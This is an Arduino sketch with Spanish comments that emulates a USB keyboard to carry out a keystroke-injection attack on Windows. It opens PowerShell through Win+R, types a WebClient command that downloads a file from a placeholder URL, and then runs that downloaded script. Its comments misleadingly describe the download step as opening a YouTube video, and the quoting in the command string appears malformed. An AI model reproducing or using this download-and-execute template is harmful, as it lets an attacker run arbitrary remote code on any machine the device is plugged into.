#include <Keyboard.h>

void setup() {
  // Inicia la emulación del teclado

  Keyboard.begin();

  // Espera un momento para asegurarse de que el sistema esté listo
  delay(1000);

  // Simula presionar Win + R (abre la ventana de ejecutar)
  Keyboard.press(KEY_LEFT_GUI);  // Tecla Windows
  Keyboard.press('r');           // Tecla R
  Keyboard.releaseAll();

  // Espera a que se abra la ventana de ejecutar
  delay(500);

  // Escribe 'cmd' para abrir el símbolo del sistema (powershell)
  Keyboard.print("powershell");
  Keyboard.write(KEY_RETURN);

  // Espera a que se abra el CMD
  delay(1000);

  // Escribe el comando para abrir el video de YouTube (usando 'start' en cmd)
  Keyboard.print("(New-Object System.Net.WebClient).DownloadFile(\"URL", \"Directorio\")"); 
  Keyboard.write(KEY_RETURN);   // Ejecuta el comando
  delay(500);
  Keyboard.print("Ubicacion_del_script");
  Keyboard.write(KEY_RETURN);

  // Finaliza la emulación del teclado
  Keyboard.end();
}

void loop() {
  // No hace nada en el loop
}
